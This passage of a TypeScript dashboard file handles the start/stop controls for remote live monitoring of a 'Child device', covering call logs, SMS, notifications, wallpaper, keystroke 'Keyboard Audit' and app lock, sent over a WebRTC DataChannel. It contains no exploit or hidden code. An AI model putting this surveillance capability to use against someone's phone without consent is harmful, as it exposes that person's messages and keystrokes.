    if (!sent) {
      console.warn('[RightSidebar] DataChannel not open. Reverting CallLog state to IDLE.');
      rightSidebarState.setCallLogMonitoringState('IDLE');
      updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'IDLE', 'Call Log');
      triggerSidebarToast('Cannot start: DataChannel not connected');
      return;
    }

    // Safety timeout fallback (20s)
    if (callLogTimeoutTimer) clearTimeout(callLogTimeoutTimer);
    callLogTimeoutTimer = setTimeout(() => {
      if (rightSidebarState.getCallLogMonitoringState() === 'STARTING') {
        console.warn('[RightSidebar] Timeout waiting for CALLLOG_STARTED. Reverting to IDLE.');
        rightSidebarState.setCallLogMonitoringState('IDLE');
        updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'IDLE', 'Call Log');
        triggerSidebarToast('Call Log request timed out');
      }
    }, 20000);

  } else if (currentState === 'LIVE') {
    console.log('[RightSidebar] Stopping Call Log monitoring...');
    rightSidebarState.setCallLogMonitoringState('STOPPING');
    updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'STOPPING', 'Call Log');

    const sent = webrtcManager.sendCommand(CMD_CALLLOG_OFF);
    if (!sent) {
      rightSidebarState.setCallLogMonitoringState('IDLE');
      updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'IDLE', 'Call Log');
      return;
    }

    if (callLogTimeoutTimer) clearTimeout(callLogTimeoutTimer);
    callLogTimeoutTimer = setTimeout(() => {
      if (rightSidebarState.getCallLogMonitoringState() === 'STOPPING') {
        rightSidebarState.setCallLogMonitoringState('IDLE');
        updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'IDLE', 'Call Log');
      }
    }, 20000);
  }
}

/**
 * Handles Play/Pause click action specifically for SMS monitoring.
 */
function handleSmsPlayPauseClick(
  playBtn: HTMLButtonElement | null,
  playIcon: HTMLImageElement | null,
  statusSpan: HTMLElement | null
): void {
  const currentState = rightSidebarState.getSmsMonitoringState();

  if (currentState === 'IDLE') {
    console.log('[RightSidebar] Starting SMS monitoring...');
    rightSidebarState.setSmsMonitoringState('STARTING');
    updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'STARTING', 'SMS Messages');

    const sent = webrtcManager.sendCommand(CMD_SMS_ON);
    if (!sent) {
      console.warn('[RightSidebar] DataChannel not open. Reverting SMS state to IDLE.');
      rightSidebarState.setSmsMonitoringState('IDLE');
      updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'IDLE', 'SMS Messages');
      triggerSidebarToast('Cannot start: DataChannel not connected');
      return;
    }

    // Safety timeout fallback (20s)
    if (smsTimeoutTimer) clearTimeout(smsTimeoutTimer);
    smsTimeoutTimer = setTimeout(() => {
      if (rightSidebarState.getSmsMonitoringState() === 'STARTING') {
        console.warn('[RightSidebar] Timeout waiting for SMS_STARTED. Reverting to IDLE.');
        rightSidebarState.setSmsMonitoringState('IDLE');
        updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'IDLE', 'SMS Messages');
        triggerSidebarToast('SMS request timed out');
      }
    }, 20000);

  } else if (currentState === 'LIVE') {
    console.log('[RightSidebar] Stopping SMS monitoring...');
    rightSidebarState.setSmsMonitoringState('STOPPING');
    updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'STOPPING', 'SMS Messages');

    const sent = webrtcManager.sendCommand(CMD_SMS_OFF);
    if (!sent) {
      rightSidebarState.setSmsMonitoringState('IDLE');
      updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'IDLE', 'SMS Messages');
      return;
    }

    if (smsTimeoutTimer) clearTimeout(smsTimeoutTimer);
    smsTimeoutTimer = setTimeout(() => {
      if (rightSidebarState.getSmsMonitoringState() === 'STOPPING') {
        rightSidebarState.setSmsMonitoringState('IDLE');
        updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'IDLE', 'SMS Messages');
      }
    }, 20000);
  }
}

/**
 * Handles Play/Pause click action specifically for Notification monitoring.
 */
function handleNotificationPlayPauseClick(
  playBtn: HTMLButtonElement | null,
  playIcon: HTMLImageElement | null,
  statusSpan: HTMLElement | null
): void {
  const currentState = rightSidebarState.getNotificationMonitoringState();

  if (currentState === 'IDLE') {
    console.log('[RightSidebar] Starting Notification monitoring...');
    rightSidebarState.setNotificationMonitoringState('STARTING');
    updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'STARTING', 'Notifications');

    const sent = webrtcManager.sendCommand(CMD_NOTIFICATION_ON);
    if (!sent) {
      console.warn('[RightSidebar] DataChannel not open. Reverting Notification state to IDLE.');
      rightSidebarState.setNotificationMonitoringState('IDLE');
      updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'IDLE', 'Notifications');
      triggerSidebarToast('Cannot start: DataChannel not connected');
      return;
    }

    // Safety timeout fallback (20s)
    if (notificationTimeoutTimer) clearTimeout(notificationTimeoutTimer);
    notificationTimeoutTimer = setTimeout(() => {
      if (rightSidebarState.getNotificationMonitoringState() === 'STARTING') {
        console.warn('[RightSidebar] Timeout waiting for NOTIFICATION_STARTED. Reverting to IDLE.');
        rightSidebarState.setNotificationMonitoringState('IDLE');
        updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'IDLE', 'Notifications');
        triggerSidebarToast('Notification monitoring request timed out');
      }
    }, 20000);

  } else if (currentState === 'LIVE') {
    console.log('[RightSidebar] Stopping Notification monitoring...');
    rightSidebarState.setNotificationMonitoringState('STOPPING');
    updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'STOPPING', 'Notifications');

    const sent = webrtcManager.sendCommand(CMD_NOTIFICATION_OFF);
    if (!sent) {
      rightSidebarState.setNotificationMonitoringState('IDLE');
      updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'IDLE', 'Notifications');
      return;
    }

    if (notificationTimeoutTimer) clearTimeout(notificationTimeoutTimer);
    notificationTimeoutTimer = setTimeout(() => {
      if (rightSidebarState.getNotificationMonitoringState() === 'STOPPING') {
        rightSidebarState.setNotificationMonitoringState('IDLE');
        updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'IDLE', 'Notifications');
      }
    }, 20000);
  }
}

/**
 * Handles Play/Pause click action specifically for Wallpaper monitoring.
 */
function handleWallpaperPlayPauseClick(
  playBtn: HTMLButtonElement | null,
  playIcon: HTMLImageElement | null,
  statusSpan: HTMLElement | null
): void {
  const currentState = rightSidebarState.getWallpaperMonitoringState();

  if (currentState === 'IDLE') {
    console.log('[RightSidebar] Starting Wallpaper monitoring...');
    rightSidebarState.setWallpaperMonitoringState('STARTING');
    updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'STARTING', 'Wallpaper');

    const sent = webrtcManager.sendCommand(CMD_WALLPAPER_ON);
    if (!sent) {
      console.warn('[RightSidebar] DataChannel not open. Reverting Wallpaper state to IDLE.');
      rightSidebarState.setWallpaperMonitoringState('IDLE');
      updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'IDLE', 'Wallpaper');
      triggerSidebarToast('Cannot start: DataChannel not connected');
      return;
    }

    // Safety timeout fallback (20s)
    if (wallpaperTimeoutTimer) clearTimeout(wallpaperTimeoutTimer);
    wallpaperTimeoutTimer = setTimeout(() => {
      if (rightSidebarState.getWallpaperMonitoringState() === 'STARTING') {
        console.warn('[RightSidebar] Timeout waiting for WALLPAPER_STARTED. Reverting to IDLE.');
        rightSidebarState.setWallpaperMonitoringState('IDLE');
        updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'IDLE', 'Wallpaper');
        triggerSidebarToast('Wallpaper monitoring request timed out');
      }
    }, 20000);

  } else if (currentState === 'LIVE') {
    console.log('[RightSidebar] Stopping Wallpaper monitoring...');
    rightSidebarState.setWallpaperMonitoringState('STOPPING');
    updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'STOPPING', 'Wallpaper');

    const sent = webrtcManager.sendCommand(CMD_WALLPAPER_OFF);
    if (!sent) {
      rightSidebarState.setWallpaperMonitoringState('IDLE');
      updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'IDLE', 'Wallpaper');
      return;
    }

    if (wallpaperTimeoutTimer) clearTimeout(wallpaperTimeoutTimer);
    wallpaperTimeoutTimer = setTimeout(() => {
      if (rightSidebarState.getWallpaperMonitoringState() === 'STOPPING') {
        rightSidebarState.setWallpaperMonitoringState('IDLE');
        updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'IDLE', 'Wallpaper');
      }
    }, 20000);
  }
}

/**
 * Toggles Keyboard Auditing live monitoring on/off via WebRTC DataChannel.
 */
function handleKeyboardPlayPauseClick(
  playBtn: HTMLButtonElement | null,
  playIcon: HTMLImageElement | null,
  statusSpan: HTMLElement | null
): void {
  const currentState = rightSidebarState.getKeyboardMonitoringState();
  if (currentState === 'STARTING' || currentState === 'STOPPING') {
    return;
  }

  if (currentState === 'IDLE') {
    console.log('[RightSidebar] Starting Keyboard monitoring...');
    rightSidebarState.setKeyboardMonitoringState('STARTING');
    updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'STARTING', 'Keyboard Audit');

    const sent = webrtcManager.sendCommand(CMD_KEYBOARD_ON);
    if (!sent) {
      console.warn('[RightSidebar] DataChannel not open. Reverting Keyboard state to IDLE.');
      rightSidebarState.setKeyboardMonitoringState('IDLE');
      updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'IDLE', 'Keyboard Audit');
      triggerSidebarToast('Cannot start: DataChannel not connected');
      return;
    }

    if (keyboardTimeoutTimer) clearTimeout(keyboardTimeoutTimer);
    keyboardTimeoutTimer = setTimeout(() => {
      if (rightSidebarState.getKeyboardMonitoringState() === 'STARTING') {
        console.warn('[RightSidebar] Timeout waiting for KEYBOARD_STARTED. Reverting to IDLE.');
        rightSidebarState.setKeyboardMonitoringState('IDLE');
        updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'IDLE', 'Keyboard Audit');
        triggerSidebarToast('Keyboard monitoring request timed out');
      }
    }, 20000);
  } else if (currentState === 'LIVE') {
    console.log('[RightSidebar] Stopping Keyboard monitoring...');
    rightSidebarState.setKeyboardMonitoringState('STOPPING');
    updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'STOPPING', 'Keyboard Audit');

    const sent = webrtcManager.sendCommand(CMD_KEYBOARD_OFF);
    if (!sent) {
      rightSidebarState.setKeyboardMonitoringState('IDLE');
      updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'IDLE', 'Keyboard Audit');
      return;
    }

    if (keyboardTimeoutTimer) clearTimeout(keyboardTimeoutTimer);
    keyboardTimeoutTimer = setTimeout(() => {
      if (rightSidebarState.getKeyboardMonitoringState() === 'STOPPING') {
        rightSidebarState.setKeyboardMonitoringState('IDLE');
        updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'IDLE', 'Keyboard Audit');
      }
    }, 20000);
  }
}

/**
 * Handles Play/Pause click action specifically for App Lock monitoring.
 */
function handleAppLockPlayPauseClick(
  playBtn: HTMLButtonElement | null,
  playIcon: HTMLImageElement | null,
  statusSpan: HTMLElement | null
): void {
  const currentState = rightSidebarState.getAppLockMonitoringState();

  if (currentState === 'IDLE') {
    console.log('[RightSidebar] Starting App Lock live monitoring...');
    rightSidebarState.setAppLockMonitoringState('STARTING');
    updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'STARTING', 'App Lock');

    const sent = webrtcManager.sendCommand(CMD_APPLOCK_ON);
    if (!sent) {
      console.warn('[RightSidebar] DataChannel not open. Reverting AppLock state to IDLE.');
      rightSidebarState.setAppLockMonitoringState('IDLE');
      updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'IDLE', 'App Lock');
      triggerSidebarToast('Cannot start: DataChannel not connected');
      return;
    }

    if (appLockTimeoutTimer) clearTimeout(appLockTimeoutTimer);
    appLockTimeoutTimer = setTimeout(() => {
      if (rightSidebarState.getAppLockMonitoringState() === 'STARTING') {
        console.warn('[RightSidebar] Timeout waiting for APPLOCK_STARTED. Reverting to IDLE.');
        rightSidebarState.setAppLockMonitoringState('IDLE');
        updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'IDLE', 'App Lock');
        triggerSidebarToast('App Lock request timed out');
      }
    }, 20000);

  } else if (currentState === 'LIVE') {
    console.log('[RightSidebar] Stopping App Lock live monitoring...');
    rightSidebarState.setAppLockMonitoringState('STOPPING');
    updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'STOPPING', 'App Lock');

    const sent = webrtcManager.sendCommand(CMD_APPLOCK_OFF);
    if (!sent) {
      rightSidebarState.setAppLockMonitoringState('IDLE');
      updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'IDLE', 'App Lock');
      return;
    }

    if (appLockTimeoutTimer) clearTimeout(appLockTimeoutTimer);
    appLockTimeoutTimer = setTimeout(() => {
      if (rightSidebarState.getAppLockMonitoringState() === 'STOPPING') {
        rightSidebarState.setAppLockMonitoringState('IDLE');
        updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'IDLE', 'App Lock');
      }
    }, 10000);
  }
}

/**
 * Updates UI state of bottom dock play/pause button and status text.
 */
function updateFooterMonitoringUi(
  btn: HTMLButtonElement | null,
  icon: HTMLImageElement | null,
  status: HTMLElement | null,
  state: 'IDLE' | 'STARTING' | 'LIVE' | 'STOPPING',
  featureLabel: string
): void {
  if (!btn || !icon || !status) return;

  switch (state) {
    case 'IDLE':
      btn.classList.remove('active', 'is-loading');
      btn.removeAttribute('disabled');
      btn.setAttribute('title', `Start Monitoring ${featureLabel}`);
      icon.src = 'assets/icons/main-content/play.svg';
      status.textContent = 'Monitoring Paused';
      status.classList.remove('live');
      break;

    case 'STARTING':
      btn.classList.add('is-loading');
      btn.classList.remove('active');
      btn.setAttribute('disabled', 'true');
      btn.setAttribute('title', `Requesting ${featureLabel} from Child device...`);
      icon.src = 'assets/icons/animations/loading.svg';
      status.textContent = `Connecting ${featureLabel}...`;
      status.classList.remove('live');
      break;

    case 'LIVE':
      btn.classList.add('active');
      btn.classList.remove('is-loading');
      btn.removeAttribute('disabled');
      btn.setAttribute('title', `Pause Monitoring ${featureLabel}`);
      icon.src = 'assets/icons/main-content/pause.svg';
      status.innerHTML = '<span class="status-live-dot"></span><span>Live Monitoring</span>';
      status.classList.add('live');
      break;

    case 'STOPPING':
      btn.classList.add('is-loading');
      btn.setAttribute('disabled', 'true');
      btn.setAttribute('title', `Stopping ${featureLabel}...`);
      icon.src = 'assets/icons/animations/loading.svg';
      status.textContent = 'Stopping...';
      status.classList.remove('live');
      break;
  }
}

/**
 * Fallback handler for generic static preview panels.
 */
function updateGenericPlayState(
  playBtn: HTMLButtonElement | null,
  playIcon: HTMLImageElement | null,
  statusSpan: HTMLElement | null,
  live: boolean
): void {
  if (live) {
    playBtn?.classList.add('active');
    playBtn?.removeAttribute('disabled');
    playBtn?.setAttribute('title', 'Pause Monitoring');
    if (playIcon) playIcon.src = 'assets/icons/main-content/pause.svg';
    if (statusSpan) {
      statusSpan.innerHTML = '<span class="status-live-dot"></span><span>Live Monitoring</span>';
      statusSpan.classList.add('live');
    }
  } else {
    playBtn?.classList.remove('active');
    playBtn?.removeAttribute('disabled');
    playBtn?.setAttribute('title', 'Start Monitoring');
    if (playIcon) playIcon.src = 'assets/icons/main-content/play.svg';
    if (statusSpan) {
      statusSpan.textContent = 'Monitoring Paused';
      statusSpan.classList.remove('live');
    }
  }
}

/**
 * Connects the drag handle on the left edge allowing custom panel width (300px - 600px).
 */
function setupResizeHandle(): void {
  const sidebar = document.getElementById('right-sidebar');
  if (!sidebar) return;

  let isResizing = false;
  let startX = 0;
  let startWidth = 380;

  sidebar.addEventListener('mousedown', (e) => {
    const target = e.target as HTMLElement | null;
    if (target?.id === 'right-sidebar-resize-handle') {
      isResizing = true;
      startX = e.clientX;
      startWidth = sidebar.getBoundingClientRect().width;
      target.classList.add('resizing');
      document.body.style.cursor = 'ew-resize';
      e.preventDefault();
    }
  });

  window.addEventListener('mousemove', (e) => {
    if (!isResizing) return;
    const delta = startX - e.clientX;
    const newWidth = Math.max(300, Math.min(600, startWidth + delta));
    sidebar.style.width = `${newWidth}px`;
    rightSidebarState.setWidth(newWidth);
  });

  window.addEventListener('mouseup', () => {
    if (isResizing) {
      isResizing = false;
      const handle = document.getElementById('right-sidebar-resize-handle');
      handle?.classList.remove('resizing');
      document.body.style.cursor = '';
    }
  });
}
